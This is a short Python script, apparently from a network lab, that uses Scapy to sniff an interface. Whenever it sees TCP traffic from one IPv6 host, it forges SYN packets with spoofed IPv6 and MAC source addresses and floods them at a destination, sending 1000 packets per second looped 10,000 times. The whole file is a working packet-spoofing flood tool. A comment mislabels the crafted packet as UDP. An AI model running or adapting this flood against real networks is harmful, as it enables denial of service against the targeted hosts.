#!/usr/bin/env python3

from scapy.all import *
import random
import threading



def packet_callback(packet):
    # check if the packet is a TCP packet
  if packet.haslayer(TCP) and packet[IPv6].src == "2001:db8:ce:11b:0:cb00:7108:1b":
        # extract the source port
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport
        print("[+] Found TCP packet with source port: ", src_port)
        # craft a new UDP packet
        ip = IPv6(dst="64:ff9b::c000:202",src="2001:db8:ce:11b:0:cb00:7108:1b")
        eth= Ether(src="00:0c:29:b3:80:01", dst="00:0c:29:e9:d1:1a")
        tcp = TCP(sport=src_port, dport=dst_port, flags="S")
        data = "From Ameen with Love!"
        packet = eth/ip/tcp/data
        new_packet = eth/ip/tcp/data
        sendpfast(new_packet, pps=1000, mbps=1000, loop=10000, iface="ens34")


# Start sniffing in a background thread
sniff_thread = threading.Thread(target=sniff, kwargs={"iface":"ens34", "prn":packet_callback})
sniff_thread.daemon = True
sniff_thread.start()

# Keep the script running in the background
while True:
    pass
